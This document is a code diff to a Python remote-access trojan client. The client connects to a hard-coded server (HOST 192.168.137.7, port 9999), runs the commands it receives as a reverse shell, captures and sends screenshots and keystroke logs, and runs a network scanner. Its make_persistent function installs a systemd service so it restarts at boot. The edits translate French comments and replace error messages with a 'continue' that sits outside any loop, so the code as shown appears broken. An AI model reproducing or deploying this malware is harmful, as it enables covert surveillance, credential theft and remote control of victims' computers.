@@ -8,13 +8,12 @@ from scanner import p_arg, s_arg
 from keylogger import log_keystrokes, start_keylogger, send_keylogs
 import threading
 
-HOST = '127.0.0.1'  # change that to the IP address of the server
-PORT = 9999  # change that to the port of the server
+HOST = '192.168.137.7'  # change that to the IP address of the server
+PORT = 9999
 
 
 def screenshot(data_stream):
     screen = ImageGrab.grab()
-    #print("Screenshot taken")
     screen_bytes = io.BytesIO()
     screen.save(screen_bytes, format='PNG')
     screen_bytes = screen_bytes.getvalue()
@@ -24,10 +23,8 @@ def screenshot(data_stream):
 
     # Send the screenshot data
     data_stream.sendall(screen_bytes)
-    #print("Screenshot sent")
 
-    #screen.show()
-    #screen.close()
+
 
 def execute_scanner(args):
     """
@@ -42,7 +39,7 @@ def execute_scanner(args):
         else:
             results = ["wrong arguments"]
         
-        return "\n".join(str(result) for result in results) if results else "Aucun résultat."
+        return "\n".join(str(result) for result in results) if results else "No results."
     except Exception as e:
         return f"Error : {e}"
 
@@ -57,7 +54,7 @@ def make_persistent():
     persistent_path_key = "/usr/local/bin/keylogger.py"
     persistent_path_scan = "/usr/local/bin/scanner.py"
     try:
-        # Copier le script actuel dans un emplacement persistant
+        # copy files into persistent directory
         current_script = os.path.realpath(__file__)
         current_dir = os.path.dirname(current_script)
         keylog_script = "keylogger.py"
@@ -71,7 +68,7 @@ def make_persistent():
         os.system(f"cp {scan_path} {persistent_path_scan}")
         os.system(f"chmod +x {persistent_path_scan}")
         
-        # Créer un fichier de service systemd
+        # Create file in systemd
         service_content = f"""
 [Unit]
 Description=Python Client Service
@@ -86,16 +83,16 @@ WorkingDirectory=/usr/local/bin
 [Install]
 WantedBy=multi-user.target
 """
-        # Écrire le fichier de service
+        # Write service file
         with open(service_path, "w") as service_file:
             service_file.write(service_content)
 
-        # Configurer le service pour démarrer au boot
+        # Commands to load and enable the service
         os.system("systemctl daemon-reload")
         os.system("systemctl enable client.service")
         os.system("systemctl start client.service")
     except Exception as e:
-        print(f"Erreur dans make_persistent : {e}")
+        continue
 
 
 
@@ -106,7 +103,7 @@ def connect_to_server():
         s.connect((HOST, PORT))
 
         while True:
-            data = s.recv(4096) # Buffer size of 4096
+            data = s.recv(4096)
 
             if data[:2].decode("utf-8") == 'cd':
                 os.chdir(data[3:].decode("utf-8"))
@@ -120,7 +117,7 @@ def connect_to_server():
                     send_keylogs(s)
                 elif data.startswith("scan"):
                     try:
-                        args = data.split()[1:]  # Exemple : scan -p
+                        args = data.split()[1:]  # Example : scan -p
                         scan_results = execute_scanner(args)
                         s.send(str.encode(scan_results + "\n"))
                     except Exception as e:
@@ -132,7 +129,7 @@ def connect_to_server():
 
                     s.send(str.encode(output_str + os.getcwd() + '> '))
     except Exception as e:
-        print(f"Erreur dans connect_to_server : {e}")
+        continue
     finally:
         s.close()
 
